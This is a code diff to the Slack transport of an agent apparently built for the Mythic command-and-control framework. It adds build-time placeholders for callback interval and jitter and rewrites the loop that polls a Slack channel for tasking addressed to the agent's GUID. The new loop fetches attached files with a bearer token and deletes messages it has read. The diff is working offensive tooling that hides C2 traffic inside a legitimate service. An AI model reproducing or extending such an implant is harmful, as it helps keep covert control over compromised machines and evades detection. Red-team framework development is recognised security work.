@@ -18,6 +18,9 @@ using Slack.NetStandard.WebApi.Conversations;
 using System.Text.Json;
 using Athena.Models.Mythic.Checkin;
 using System.Text.Json.Serialization;
+using static System.Collections.Specialized.BitVector32;
+using Section = Slack.NetStandard.Messages.Blocks.Section;
+using System.Net.Http.Headers;
 
 namespace Athena
 {
@@ -32,9 +35,9 @@ namespace Athena
         {
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.profile = new Slack();
 
@@ -166,7 +169,7 @@ namespace Athena
 
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                 DeleteMessages(result.Keys.ToList());
-                
+
                 if (this.encrypted)
                 {
                     return this.crypt.Decrypt(strRes);
@@ -266,39 +269,53 @@ namespace Athena
 
                 var conversationsResponse = await this.client.Conversations.History(request);
 
-                if (conversationsResponse.OK)
+                if (!conversationsResponse.OK)
                 {
-                    conversationsResponse.Messages.ToList<Message>().ForEach(async message =>
-                    {
-                        try
-                        {
-                            if (message.Text.Contains(this.agent_guid))
-                            {
-                                MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);
-
-                                if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
-                                {
-                                    if (String.IsNullOrEmpty(mythicMessage.message))
-                                    {
-                                        var res = await this.client.Client.GetAsync(message.Files.FirstOrDefault().UrlPrivateDownload);
-
-
-                                        mythicMessage.message = await res.Content.ReadAsStringAsync();
-                                        messages.Add(message.Timestamp, mythicMessage);
-                                    }
-                                    else
-                                    {
-                                        messages.Add(message.Timestamp, mythicMessage);
-                                    }
-                                }
-                            }
-
-                        }
-                        catch (Exception e)
-                        {
-                        }
-                    });
+                    return messages;
                 }
+
+
+                foreach (var message in conversationsResponse.Messages.ToList<Message>())
+                {
+                    if (message is null || String.IsNullOrEmpty(message.Text) || !message.Text.Contains(this.agent_guid))
+                    {
+                        continue;
+                    }
+
+                    MythicMessageWrapper mythicMessage;
+
+                    try
+                    {
+                        mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);
+                    }
+                    catch (JsonException)
+                    {
+                        continue;
+                    }
+
+                    if (mythicMessage == null || mythicMessage.to_server || mythicMessage.sender_id != this.agent_guid)
+                    {
+                        continue;
+                    }
+
+                    if (String.IsNullOrEmpty(mythicMessage.message))
+                    {
+                        using (var requestMessage = new HttpRequestMessage(HttpMethod.Get, message.Files.First().UrlPrivateDownload))
+                        {
+                            requestMessage.Headers.Authorization = new AuthenticationHeaderValue("Bearer", this.messageToken);
+
+                            var res = await this.client.Client.SendAsync(requestMessage);
+
+                            if (res.IsSuccessStatusCode)
+                            {
+                                mythicMessage.message = await res.Content.ReadAsStringAsync();
+                            }
+                        }
+                    }
+
+                    messages.Add(message.Timestamp, mythicMessage);
+                }
+
                 if (messages.Count > 0) //we got something for us
                 {
                     break;
